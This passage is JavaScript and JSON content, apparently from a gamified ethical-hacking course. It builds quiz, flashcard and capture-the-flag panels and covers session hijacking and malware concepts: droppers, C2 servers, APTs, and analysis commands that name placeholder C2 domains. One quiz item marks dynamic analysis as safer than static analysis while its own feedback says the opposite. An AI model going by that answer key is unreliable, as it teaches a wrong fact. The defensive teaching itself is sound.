      "fb": "Without the Secure flag, the cookie could be sniffed over HTTP. Even without HttpOnly, it could be stolen via XSS. Both are viable vectors."
    }
  ],
  "flashcards": [
    {
      "f": "Session Fixation",
      "b": "An attack where the adversary forces a user to authenticate using a known session ID."
    },
    {
      "f": "HttpOnly Flag",
      "b": "A cookie attribute that prevents client-side scripts from accessing the cookie."
    },
    {
      "f": "Secure Flag",
      "b": "A cookie attribute ensuring the cookie is only sent over encrypted (HTTPS) connections."
    },
    {
      "f": "Cross-Site Scripting (XSS)",
      "b": "An attack that injects malicious scripts into trusted websites, often used to steal cookies."
    }
  ],
  "summary": [
    "Application-level hijacking targets flaws in session management and web application logic.",
    "XSS is a primary method for stealing session cookies if HttpOnly is not used.",
    "Session Fixation tricks users into logging in with an attacker-controlled session ID.",
    "Mitigations include regenerating session IDs upon login and using Secure/HttpOnly flags.",
    "Predictable session IDs allow attackers to guess valid sessions without interaction."
  ],
  "outcomes": [
    "Identify vulnerabilities that lead to application-level session hijacking.",
    "Explain how XSS and Session Fixation are executed.",
    "Apply mitigation strategies like secure cookie attributes and session regeneration."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 50,
    "difficulty": "Advanced",
    "prerequisites": [
      "Web Application Security",
      "HTTP Protocol"
    ],
    "lastReviewed": "2026-07-18"
  }
}
function buildAssessmentHTML(d){
  return `
  <div style="margin-bottom:32px;">
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 1 OF 3 — KNOWLEDGE CHECK</div>
    <div class="quiz-score" id="quiz-score" style="display:none;"></div>
    ${buildQuizHTML(d)}
  </div>
  <div style="margin-bottom:32px;">
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 2 OF 3 — FLASHCARDS (hover to flip)</div>
    ${buildFlashcardsHTML(d)}
  </div>
  <div>
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 3 OF 3 — CAPTURE THE FLAG</div>
    ${buildCTFHTML(d)}
  </div>`;
}
function buildSummaryHTML(id,d){
  const isDone=!!completed[id];
  return `
  <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;">
    <div style="font-size:1rem;font-weight:700;color:var(--green);margin-bottom:20px;font-family:var(--mono);">// KEY TAKEAWAYS — EXAM READY</div>
    ${d.summary&&d.summary.length?`<ul class="summary-list">${d.summary.map(s=>`<li>${s}</li>`).join('')}</ul>`:'<div style="color:var(--text-dim);">Summary content coming soon.</div>'}
    <div style="margin-top:32px;padding-top:24px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
      <div id="complete-status-${id}" style="font-family:var(--mono);font-size:0.8rem;color:var(--text-dim);">
        ${isDone?'<span style="color:var(--green);">\u2713 TOPIC COMPLETED — XP AWARDED</span>':'Complete all sections, then mark done to earn XP.'}
      </div>
      <button class="btn-complete" id="btn-complete-${id}" onclick="markComplete('${id}')"
        ${isDone?'disabled style="opacity:0.5;cursor:default;"':''}>
        ${isDone?'\u2713 COMPLETED':'\u2714 MARK COMPLETE — EARN 200 XP'}
      </button>
    </div>
  </div>`;
}
function buildQuizHTML(d){
  if(!d.quiz||!d.quiz.length) return buildComingSoonHTML('\u2753','Quiz — 10 questions coming soon');
  return d.quiz.map((q,i)=>`
    <div class="quiz-q" data-qi="${i}" data-correct="${q.correct}">
      <div class="quiz-q-num">QUESTION ${String(i+1).padStart(2,'0')} / ${d.quiz.length}</div>
      <div class="quiz-q-text">${q.q}</div>
      <div class="quiz-opts">${q.opts.map((o,oi)=>`<button class="quiz-opt" data-oi="${oi}" onclick="answerQuiz(this,${i},${oi})">${o}</button>`).join('')}</div>
      <div class="quiz-fb">${q.fb}</div>
    </div>
  `).join('');
}
function buildFlashcardsHTML(d){
  if(!d.flashcards||!d.flashcards.length) return buildComingSoonHTML('\u{1F0CF}','Flashcards coming soon');
  return `
  <div style="margin-bottom:10px;font-family:var(--mono);font-size:0.75rem;color:var(--text-muted);">// Hover a card to flip and reveal the definition</div>
  <div class="flashcards-grid">${d.flashcards.map(f=>`<div class="flashcard"><div class="fc-front">${f.f}</div><div class="fc-back">${f.b}</div></div>`).join('')}</div>`;
}
function buildCTFHTML(d){
  const ctf=d.ctf||{scenario:'Complete all sections to unlock the CTF challenge.',hint:'Study the Learn and Commands tabs first.',flag:'',points:150};
  return `
  <div class="ctf-card">
    <div class="ctf-header"><div class="ctf-flag-icon">\u{1F6A9}</div><div><div class="ctf-title">CAPTURE THE FLAG</div><div class="ctf-subtitle">// CLASSIFIED INTELLIGENCE CHALLENGE</div></div></div>
    <div class="ctf-points">\u{1F48E} ${ctf.points||150} POINTS</div>
    <div class="ctf-scenario">${ctf.scenario}</div>
    <div class="ctf-hint" id="ctf-hint" onclick="revealHint(this)" data-hint="${ctf.hint||''}">\u{1F4A1} HINT: Click to reveal (costs no points)</div>
    <div class="ctf-input-row">
      <input class="ctf-input" id="ctf-flag-input" placeholder="CEH{your_flag_here}" autocomplete="off" spellcheck="false"/>
      <button class="ctf-submit" onclick="submitCTF('${currentTopic}')">SUBMIT FLAG</button>
    </div>
    <div class="ctf-result" id="ctf-result"></div>
  </div>`;
}

const d = {
"eyebrow": "Module 07 \u00b7 Topic 1",
"title": "Malware Concepts",
"module": "Phase 07: Malware Analyst",
"sub": "Static vs Dynamic, APTs, and Droppers",
"objectives": [
"Understand static vs dynamic analysis",
"Identify APT characteristics",
"Explain malware droppers"
],
"learn": {
"simple": "Malware concepts encompass the fundamental theories of malicious software, including how it is created, propagated, and analyzed. Understanding the difference between static (examining code without running it) and dynamic (running it in a sandbox) analysis is key. Advanced Persistent Threats (APTs) represent sophisticated, long-term attacks, often state-sponsored, while droppers are specialized malware designed to install other malware.",
"analogy": "Think of a dropper as a trojan horse that smuggles an army (the actual malware payload) into a fortress (your computer). Static analysis is like reading the blueprints of the horse, while dynamic analysis is watching the horse operate in a safe, contained environment.",
"architecture": "A typical malware dropper is a lightweight executable, often polymorphic or packed to evade detection. Once executed, it reaches out to a Command and Control (C2) server to download the primary payload, decrypts it in memory, and executes it, typically employing process hollowing or DLL injection. APTs leverage these droppers as part of a multi-stage kill chain, establishing persistence through registry keys, WMI subscriptions, or scheduled tasks.",
"why": "Understanding these concepts is critical for enterprise defense because modern malware frequently evades traditional antivirus through obfuscation and multi-stage delivery mechanisms. Defense-in-depth requires analyzing both the delivery mechanism (dropper) and the payload."
},
"enterprise": {
"gfs": "At Global Financial Services, we observed an incident where a phishing email delivered a dropper disguised as a PDF. It attempted to download a banking trojan, but our EDR flagged the anomalous network connection.",
"windows": "In Windows, malware droppers often abuse legitimate binaries (Living off the Land) like bitsadmin.exe or powershell.exe to download payloads.",
"linux": "On Linux, attackers may use curl or wget in bash scripts, establishing persistence via cron jobs or systemd services."
},
"workflow": [
"Step 1: Identify suspicious file.",
"Step 2: Isolate the system.",
"Step 3: Perform static analysis.",
"Step 4: Perform dynamic analysis.",
"Step 5: Extract IOCs.",
"Step 6: Update defenses."
],
"diagram": {
"caption": "Click to interact with the diagram",
"svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"50\" y=\"50\" width=\"100\" height=\"50\" fill=\"#f00\"/><text x=\"75\" y=\"80\">Dropper</text></svg>"
},
"commands": {
"lin": [
{
"cmd": "strings suspicious_file | grep http",
"purpose": "Extract URLs from dropper",
"out": "http://c2.example.com",
"note": "Basic static analysis",
"mistake": "Running the executable instead of strings"
}
],
"win": [
{
"cmd": "Get-FileHash suspicious_file.exe",
"purpose": "Calculate hash for OSINT lookup",
"out": "SHA256 hash",
"note": "Check VirusTotal",
"mistake": "Relying only on MD5"
}
]
},
"lab": {
"type": "guided",
"difficulty": "Advanced",
"duration": "45",
"platform": "Kali Linux",
"environment": "Local Lab",
"tools": [
"YARA",
"Cuckoo"
],
"dependencies": [],
"safety": [
"Perform this lab only in an isolated sandbox environment."
],
"scenario": "GFS incident response team needs to analyze a suspected dropper found on a trading terminal.",
"objectives": [
"Identify the C2 domain using static analysis."
],
"steps": [
"Step 1: Run strings against the malware sample with `strings sample.exe`."
],
"evidence": [
"Terminal output showing the extracted domain."
],
"validation": [
"You should see: evil-c2.com"
],
"troubleshooting": [
"If no output, try using a deobfuscator."
],
"mitre": [
{
"id": "T1106",
"name": "Native API",
"tactic": "Execution"
}
],
"cleanup": [
"Revert the sandbox VM."
]
},
"quiz": [
{
"type": "multiple-choice",
"difficulty": "Intermediate",
"q": "What is the primary function of a malware dropper?",
"opts": [
"To encrypt files",
"To download and install other malware",
"To steal passwords",
"To launch DDoS attacks"
],
"correct": 1,
"fb": "A dropper\'s main purpose is to 'drop' or install the primary malware payload onto the system."
},
{
"type": "multiple-choice",
"difficulty": "Intermediate",
"q": "Which analysis method involves executing the malware?",
"opts": [
"Static analysis",
"Dynamic analysis",
"Heuristic analysis",
"Signature analysis"
],
"correct": 1,
"fb": "Dynamic analysis involves running the malware in a controlled environment to observe its behavior."
},
{
"type": "multiple-choice",
"difficulty": "Intermediate",
"q": "What does APT stand for?",
"opts": [
"Advanced Persistent Threat",
"Automated Phishing Tool",
"Active Process Tracker",
"Advanced Payload Trojan"
],
"correct": 0,
"fb": "APT stands for Advanced Persistent Threat, typically state-sponsored actors."
},
{
"type": "true-false",
"difficulty": "Easy",
"q": "Static analysis requires running the malware in a sandbox.",
"opts": [
"True",
"False"
],
"correct": 1,
"fb": "False. Static analysis examines the code without executing it."
},
{
"type": "multiple-choice",
"difficulty": "Advanced",
"q": "Which technique is commonly used by droppers to evade static analysis?",
"opts": [
"Code signing",
"Packing",
"Network encryption",
"Privilege escalation"
],
"correct": 1,
"fb": "Packing compresses and obfuscates the executable, making static analysis difficult."
},
{
"type": "multiple-choice",
"difficulty": "Intermediate",
"q": "What is a C2 server?",
"opts": [
"Command and Control server",
"Cryptographic Calculation server",
"Client-to-Client server",
"Core Configuration server"
],
"correct": 0,
"fb": "C2 stands for Command and Control, used by attackers to manage malware."
},
{
"type": "true-false",
"difficulty": "Easy",
"q": "Droppers always contain the full malware payload within themselves.",
"opts": [
"True",
"False"
],
"correct": 1,
"fb": "False. They often download the payload from a C2 server."
},
{
"type": "multiple-choice",
"difficulty": "Intermediate",
"q": "Which of the following is a characteristic of an APT?",
"opts": [
"Short-term attack",
"Random targets",
"Long-term persistence",
"Loud, disruptive attacks"
],
"correct": 2,
"fb": "APTs aim to maintain long-term, undetected access to the target network."
},
{
"type": "multiple-choice",
"difficulty": "Advanced",
"q": "What is process hollowing?",
"opts": [
"A denial of service attack",
"Injecting malicious code into a legitimate process",
"Deleting system files",
"Extracting passwords from memory"
],
"correct": 1,
"fb": "Process hollowing involves replacing the code of a legitimate process with malicious code."
},
{
"type": "true-false",
"difficulty": "Easy",
"q": "Dynamic analysis is safer than static analysis because the malware is contained.",
"opts": [
"True",
"False"
],
"correct": 0,
"fb": "True, but both have their uses. Static analysis is inherently safe because the code isn\'t executed."
}
],
"flashcards": [
{
"f": "Dropper",
"b": "Malware designed to install other malware payloads."
},
{
"f": "APT",
"b": "Advanced Persistent Threat; a sophisticated, long-term cyberattack."
}
],
"summary": [
"Malware concepts include droppers, APTs, and analysis techniques.",
"Static analysis examines code without running it.",
"Dynamic analysis observes malware behavior in a sandbox.",
"Droppers deliver primary payloads.",
"APTs are stealthy, long-term threats."
],
"outcomes": [
"Explain static vs dynamic analysis.",
"Identify characteristics of APTs and droppers."
],
"meta": {
"contentVersion": "1.0.0",
"estimatedTime": 45,
"difficulty": "Advanced",
"prerequisites": [],
"lastReviewed": "2026-07-18"
}
};
CONTENT['malware-concepts'] = d;
function buildComingSoonHTML() { return ''; } // mock
try {
    const html = buildTopicHTML('malware-concepts', d);
    console.log('SUCCESS!');
    console.log('HTML Length:', html.length);
} catch(e) {
    console.error('ERROR:', e.stack);
}
